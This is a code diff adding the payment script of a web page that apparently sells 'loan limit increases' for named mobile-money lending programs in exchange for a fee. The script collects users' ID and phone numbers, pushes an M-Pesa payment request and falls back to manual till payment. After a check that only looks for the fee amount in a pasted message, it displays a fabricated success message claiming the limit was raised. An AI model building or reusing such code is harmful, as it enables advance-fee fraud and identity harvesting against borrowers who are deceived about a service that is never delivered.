+    // ─── EVENT LISTENERS ──────────────────────────────────────────────
+    btnGetNow.addEventListener('click', () => {
+      detailsModal.classList.add('show');
+    });
+
+    document.getElementById('btn-modal-cancel').addEventListener('click', () => {
+      detailsModal.classList.remove('show');
+    });
+
+    document.getElementById('btn-modal-continue').addEventListener('click', () => {
+      const idVal = document.getElementById('input-id').value.trim();
+      let phoneVal = document.getElementById('input-phone').value;
+
+      if (!idVal) {
+        Swal.fire({ icon: 'warning', title: 'Missing Information', text: 'Please enter your ID number.', confirmButtonColor: '#1a7a1a' });
+        return;
+      }
+
+      try {
+        phoneVal = normalizePhoneInput(phoneVal);
+      } catch (e) {
+        Swal.fire({ icon: 'warning', title: 'Invalid Phone', text: e.message, confirmButtonColor: '#1a7a1a' });
+        return;
+      }
+
+      userData = { idNumber: idVal, phoneNumber: phoneVal };
+      detailsModal.classList.remove('show');
+      initiatePaymentFlow();
+    });
+
+    // ─── PAYMENT API HELPERS ──────────────────────────────────────────
+    async function sendPayHeroSTK(phoneNumber, amount, loanAmount, idNumber) {
+      const resp = await fetch(API_ENDPOINTS.initiatePayment, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          phone_number: phoneNumber,
+          amount: amount,
+          loan_amount: loanAmount,
+          id_number: idNumber
+        })
+      });
+      if (!resp.ok) {
+        const err = await resp.json();
+        throw new Error(err.message || 'Payment initiation failed');
+      }
+      return await resp.json();
+    }
+
+    async function checkPaymentStatus(reference, maxAttempts = 20, intervalMs = 3000) {
+      let attempts = 0;
+      return new Promise((resolve, reject) => {
+        const interval = setInterval(async () => {
+          attempts++;
+          try {
+            const resp = await fetch(`${API_ENDPOINTS.verifyPayment}?reference=${encodeURIComponent(reference)}`);
+            if (!resp.ok) {
+              if (attempts >= maxAttempts) { clearInterval(interval); reject(new Error('Verification failed')); }
+              return;
+            }
+            const data = await resp.json();
+            if (data.success && (data.status === 'COMPLETED' || data.status === 'SUCCESS')) {
+              clearInterval(interval);
+              resolve(true);
+            } else if (data.success && (data.status === 'FAILED' || data.status === 'CANCELLED')) {
+              clearInterval(interval);
+              reject(new Error('Payment failed or cancelled'));
+            } else if (attempts >= maxAttempts) {
+              clearInterval(interval);
+              reject(new Error('Verification timeout'));
+            }
+          } catch (e) {
+            if (attempts >= maxAttempts) { clearInterval(interval); reject(new Error('Verification failed')); }
+          }
+        }, intervalMs);
+      });
+    }
+
+    // ─── MANUAL FALLBACK ──────────────────────────────────────────────
+    function extractAmountFromMpesaMessage(msg) {
+      const match = msg.match(/(\d+(?:\.\d{1,2})?)/);
+      if (!match) return null;
+      const amt = parseFloat(match[1]);
+      return isNaN(amt) ? null : amt;
+    }
+
+    function showManualPaymentFallback(rawPhone) {
+      Swal.fire({
+        html: '<div style="display:flex;justify-content:center;align-items:center;height:80px;"><i class="fas fa-spinner fa-pulse" style="font-size:2.5rem;color:#1a7a1a;"></i></div>',
+        showConfirmButton: false,
+        allowOutsideClick: false,
+        didOpen: () => Swal.showLoading()
+      });
+
+      setTimeout(() => {
+        Swal.close();
+        const feeAmount = selectedLimit ? selectedLimit.fee : 0;
+        
+        Swal.fire({
+          title: 'Complete Payment Manually',
+          html: `
+            <div style="text-align:left;padding:0 4px;">
+              <div class="manual-payment-box">
+                <i class="fas fa-info-circle"></i> <strong>STK Push failed</strong>
+                <p style="font-size:0.85rem;margin-top:4px;">Don't worry – you can pay manually.</p>
+              </div>
+              <p style="font-weight:600;font-size:0.85rem;margin-top:8px;">Follow these steps:</p>
+              <ol style="font-size:0.85rem;color:#222;padding-left:20px;margin:8px 0;">
+                <li>Open M-Pesa <strong>Lipa Na M-Pesa</strong> → <strong>Buy Goods</strong></li>
+                <li>Enter Till Number: <strong style="color:#1a7a1a;">${TILL_NUMBER}</strong></li>
+                <li>Enter Amount: <strong style="color:#d93025;">Ksh ${feeAmount}</strong></li>
+                <li>Enter your PIN and complete payment</li>
+                <li>Paste the confirmation message below</li>
+              </ol>
+              <div class="copy-till" style="justify-content:center;">
+                <span class="till-number">${TILL_NUMBER}</span>
+                <button class="copy-btn-sm" id="copyTillManualBtn"><i class="fas fa-copy"></i> Copy</button>
+              </div>
+              <div class="manual-input-group">
+                <label><i class="fas fa-paste"></i> Paste your M-Pesa confirmation message</label>
+                <textarea id="manualTxInput" placeholder="Paste the full message here..." rows="3"></textarea>
+                <div class="error-msg" id="manualErrorMsg">Invalid amount or message. Please check and try again.</div>
+              </div>
+              <div class="manual-actions">
+                <button class="btn-primary" id="submitManualPaymentBtn">
+                  <i class="fas fa-check"></i> I have paid
+                </button>
+                <button class="btn-secondary" id="cancelManualBtn">
+                  <i class="fas fa-times"></i> Cancel
+                </button>
+              </div>
+            </div>
+          `,
+          icon: false,
+          showConfirmButton: false,
+          allowOutsideClick: false,
+          didOpen: () => {
+            document.getElementById('copyTillManualBtn').addEventListener('click', () => {
+              navigator.clipboard.writeText(TILL_NUMBER);
+              showToast('Till number copied!');
+            });
+
+            document.getElementById('submitManualPaymentBtn').addEventListener('click', () => {
+              const rawMsg = document.getElementById('manualTxInput').value.trim();
+              const textarea = document.getElementById('manualTxInput');
+              const errorMsg = document.getElementById('manualErrorMsg');
+
+              textarea.classList.remove('error');
+              errorMsg.classList.remove('show');
+
+              if (!rawMsg) {
+                textarea.classList.add('error');
+                errorMsg.textContent = 'Please paste your M-Pesa confirmation message.';
+                errorMsg.classList.add('show');
+                textarea.focus();
+                return;
+              }
+              
+              const extracted = extractAmountFromMpesaMessage(rawMsg);
+              if (extracted === null) {
+                textarea.classList.add('error');
+                errorMsg.textContent = 'Please paste the correct Mpesa message';
+                errorMsg.classList.add('show');
+                textarea.value = '';
+                textarea.focus();
+                return;
+              }
+              
+              const expected = selectedLimit ? selectedLimit.fee : 0;
+              if (Math.abs(extracted - expected) < 0.01) {
+                Swal.close();
+                completeManualPayment(rawPhone, rawMsg, extracted);
+              } else {
+                textarea.classList.add('error');
+                errorMsg.textContent = 'Invalid message. Please check and try again.';
+                errorMsg.classList.add('show');
+                textarea.value = '';
+                textarea.focus();
+              }
+            });
+
+            document.getElementById('cancelManualBtn').addEventListener('click', () => {
+              Swal.close();
+              window.location.reload();
+            });
+          }
+        });
+      }, 2000);
+    }
+
+    function completeManualPayment(phone, rawMessage, extractedAmount) {
+      Swal.fire({
+        title: 'Processing Payment',
+        html: 'Verifying your manual payment...',
+        allowOutsideClick: false,
+        didOpen: () => Swal.showLoading()
+      });
+
+      setTimeout(() => {
+        Swal.close();
+        Swal.fire({
+          title: 'Payment Successful!',
+          html: `
+            <div style="text-align:center;padding:0 4px;">
+              <div class="success-icon"><i class="fas fa-check-circle"></i></div>
+              <p><strong>Your ${programs[currentProgramKey].name} limit has been increased!</strong></p>
+              <p style="color:#666;margin-top:6px;">New limit: <strong style="color:#1a7a1a;">Ksh ${selectedLimit.amount.toLocaleString()}</strong></p>
+              <div style="background:linear-gradient(135deg,rgba(26,122,26,0.1),rgba(26,122,26,0.05));border-left:3px solid #d93025;padding:10px;border-radius:8px;margin-top:12px;text-align:left;font-size:0.75rem;color:#222;line-height:1.4;">
+                <div style="display:flex;align-items:flex-start;gap:6px;margin-bottom:2px;">
+                  <i class="fas fa-exclamation-circle" style="color:#d93025;font-size:0.8rem;"></i>
+                  <strong style="color:#d93025;">Important:</strong>
+                </div>
+                <div style="padding-left:20px;">
+                  If limit doesn't increase immediately:<br>
+                  1. Dial *334# → Check Limit<br>
+                  2. Wait 2 mins and refresh your app
+                </div>
+              </div>
+              <p style="color:#666;margin-top:8px;font-size:0.75rem;">Thank you for using our service!</p>
+            </div>
+          `,
+          icon: false,
+          confirmButtonText: 'Continue',
+          confirmButtonColor: '#1a7a1a',
+          timer: 10000,
+          timerProgressBar: true
+        });
+      }, 1500);
+    }
+
+    // ─── MAIN PAYMENT FLOW ────────────────────────────────────────────
+    async function initiatePaymentFlow() {
+      if (isProcessing) return;
+      const phone = userData.phoneNumber;
+      
+      isProcessing = true;
+
+      try {
+        const confirmed = await Swal.fire({
+          title: 'Confirm Limit Increase',
+          html: `
+            <div class="payment-confirm-content">
+              <div class="payment-confirm-icon"><i class="fas fa-wallet"></i></div>
+              <div class="payment-details-box">
+                <div class="payment-detail-row"><span>Program:</span><strong>${programs[currentProgramKey].name}</strong></div>
+                <div class="payment-detail-row"><span>New Limit:</span><strong style="color:#1a7a1a;">Ksh ${selectedLimit.amount.toLocaleString()}</strong></div>
+                <div class="payment-detail-row"><span>Processing Fee:</span><strong>Ksh ${selectedLimit.fee}</strong></div>
+                <div class="payment-detail-row"><span>ID Number:</span><strong>${userData.idNumber}</strong></div>
+                <div class="payment-detail-row"><span>Phone:</span><strong>0${formatPhoneForDisplay(phone)}</strong></div>
+              </div>
+              <p class="payment-phone-note">An M-Pesa STK push will be sent to your phone</p>
+            </div>
+          `,
+          icon: false,
+          showCancelButton: true,
+          confirmButtonText: 'Proceed with Payment',
+          cancelButtonText: 'Cancel',
+          confirmButtonColor: '#1a7a1a',
+          cancelButtonColor: '#6b7280'
+        });
+        
+        if (!confirmed.isConfirmed) { 
+          isProcessing = false;
+          return; 
+        }
+
+        Swal.fire({
+          title: 'Preparing Payment',
+          html: 'Please wait...',
+          allowOutsideClick: false,
+          didOpen: () => Swal.showLoading()
+        });
+
+        const normalizedPhone = await normalizePhoneNumber(phone);
+
+        Swal.update({
+          title: 'Sending M-Pesa STK Push',
+          html: 'Initiating payment request...'
+        });
+
+        const paymentResponse = await sendPayHeroSTK(
+          normalizedPhone,
+          selectedLimit.fee,
+          selectedLimit.amount,
+          userData.idNumber
+        );
+
+        if (!paymentResponse || !paymentResponse.reference) {
+          throw new Error('Failed to initiate payment');
+        }
+
+        const paymentReference = paymentResponse.reference;
+
+        Swal.fire({
+          title: 'STK Push Sent!',
+          html: `
+            <div class="stk-push-content">
+              <div class="stk-push-icon"><i class="fas fa-mobile-alt"></i></div>
+              <p><strong>Check your phone for the M-Pesa STK push</strong></p>
+              <div class="stk-phone-display">${formatPhoneForDisplay(phone)}</div>
+              <p style="color:#666;margin-top:5px;">Enter your M-Pesa PIN to complete</p>
+              <div style="background:#f8f9f7;padding:8px;border-radius:8px;margin-top:10px;"><small>Verifying payment...</small></div>
+            </div>
+          `,
+          icon: false,
+          showConfirmButton: false,
+          allowOutsideClick: false
+        });
+
+        const paymentSuccess = await checkPaymentStatus(paymentReference);
+
+        if (paymentSuccess) {
+          await Swal.fire({
+            title: 'Payment Successful!',
+            html: `
+              <div style="text-align:center;padding:0 4px;">
+                <div class="success-icon"><i class="fas fa-check-circle"></i></div>
+                <p><strong>Your ${programs[currentProgramKey].name} limit has been increased!</strong></p>
+                <p style="color:#666;margin-top:6px;">New limit: <strong style="color:#1a7a1a;">Ksh ${selectedLimit.amount.toLocaleString()}</strong></p>
+                <div style="background:linear-gradient(135deg,rgba(26,122,26,0.1),rgba(26,122,26,0.05));border-left:3px solid #d93025;padding:10px;border-radius:8px;margin-top:12px;text-align:left;font-size:0.75rem;color:#222;line-height:1.4;">
+                  <div style="display:flex;align-items:flex-start;gap:6px;margin-bottom:2px;">
+                    <i class="fas fa-exclamation-circle" style="color:#d93025;font-size:0.8rem;"></i>
+                    <strong style="color:#d93025;">Important:</strong>
+                  </div>
+                  <div style="padding-left:20px;">
+                    If limit doesn't increase immediately:<br>
+                    1. Dial *334# → Check Limit<br>
+                    2. Wait 2 mins and refresh your app
+                  </div>
+                </div>
+                <p style="color:#666;margin-top:8px;font-size:0.75rem;">Thank you for using our service!</p>
+              </div>
+            `,
+            icon: false,
+            confirmButtonText: 'Continue',
+            confirmButtonColor: '#1a7a1a',
+            timer: 10000,
+            timerProgressBar: true
+          });
+        } else {
+          throw new Error('Payment not confirmed');
+        }
+      } catch (error) {
+        console.error('Payment error:', error);
+        showManualPaymentFallback(phone);
+      } finally {
+        isProcessing = false;
+      }
+    }
+
+    // Initialize
+    setProgram('mshwari');
+    startLiveFeed();
+  </script>
+</body>
+</html>
